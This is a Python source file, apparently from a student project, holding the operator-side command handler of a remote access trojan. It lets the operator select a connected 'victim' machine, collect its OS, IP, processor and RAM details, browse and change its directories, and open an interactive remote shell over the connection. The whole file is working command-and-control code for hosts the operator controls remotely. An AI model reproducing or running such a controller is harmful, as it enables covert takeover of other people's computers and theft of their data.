# **************************************************************************** #
#                                                                              #
#                                                         :::      ::::::::    #
#    commands.py                                        :+:      :+:    :+:    #
#                                                     +:+ +:+         +:+      #
#    By: TheRed <TheRed@students.42.fr>             +#+  +:+       +#+         #
#                                                 +#+#+#+#+#+   +#+            #
#    Created: 2024/07/22 00:20:32 by TheRed            #+#    #+#              #
#    Updated: 2024/07/22 00:20:32 by TheRed           ###   ########.fr        #
#                                                                              #
# **************************************************************************** #

import threading
import time
import json
import sys

from client import Client

class Command:
	def __init__(self, server) -> None:
		from server import Server

		self.server:	Server = server

	def command(self, command_name: str, args: list) -> None:
		print("\n")
		command_list = dir(self)

		if (command_name == "use"):
			return self.use(args)

		client = self.server.getClient()
		if (not client):
			return

		if command_name in command_list:
			getattr(self, command_name)(args, client)

	def use(self, args: list) -> None:
		if len(args) == 0:
			self.server.printer.info("Usage: use <client_id>\n")
			return

		client_id = int(args[0])
		if (not self.server.getClient(client_id)):
			return

		self.server.client_id = client_id
		self.server.printer.info(f"Using client {client_id}\n")

	def info(self, args: list, client: Client) -> None:
		client.sendData("command", ["info", []])

		printer = self.server.printer
		
		response = client.recv()
		if not response:
			return

		info = json.loads(response)

		printer.good(f"{info['name']}")
		printer.info(f" - OS: {info['platform']}")
		printer.info(f" - IP: {client.addr[0]}")
		printer.info(f" - Architecture: {info['architecture'][0]}")
		printer.info(f" - Processor: {info['processor']}")
		printer.info(f" - RAM: {info['ram']}")

		print("\n")

	def list(self, args: list, client: Client) -> None:
		offset = 0

		for id in range(0, len(self.server.clients)):
			victim = self.server.getClient(id - offset, error=False)
			self.info([], victim)

			if (not victim.connected):
				offset += 1


	def cd(self, args: list, client: Client) -> None:
		path = "~"
		if (len(args) != 0):
			path = args[0]

		client.sendData("command", ["cd", path])
		
		response = client.recv()
		if (not response):
			return

		response = json.loads(response)
		if (response["success"]):
			client.path = response["path"]
		else:
			self.server.printer.bad("Path does not exist")

	def ls(self, args: list, client: Client) -> None:
		path = None
		if (len(args) != 0):
			path = args[0]
		client.sendData("command", ["ls", path])

		if (path == None):
			path = client.path
		self.server.printer.info(f"{path}: ")
		
		response = client.recv()
		if (not response):
			return

		response = json.loads(response)
		response = dict(sorted(response.items(), key=lambda x: x[1]["directory"], reverse=True))

		for dir in response.keys():
			stats = response[dir]
			print(f"  {time.ctime(stats['time'])}\t", end="")
			if (dir.startswith(".")):
				self.server.printer.lightblue(dir)
			elif (stats["directory"]):
				self.server.printer.cyan(dir + "\\")
			else:
				self.server.printer.lightwhite(dir)
		
		print("\n")


	def shell(self, args: list, client: Client) -> None:
		client.sendData("command", ["shell", []])

		def receive_shell():
			while True:
				response = client.recv(decoding="cp850")
				if not response or response == "EXIT":
					break
				print(response, end="")
				sys.stdout.flush()
		
		threading.Thread(target=receive_shell, daemon=True).start()

		has_sent = True
		while has_sent:
			command = input()
			has_sent = client.send(command)
			
			if command == "EXIT":
				break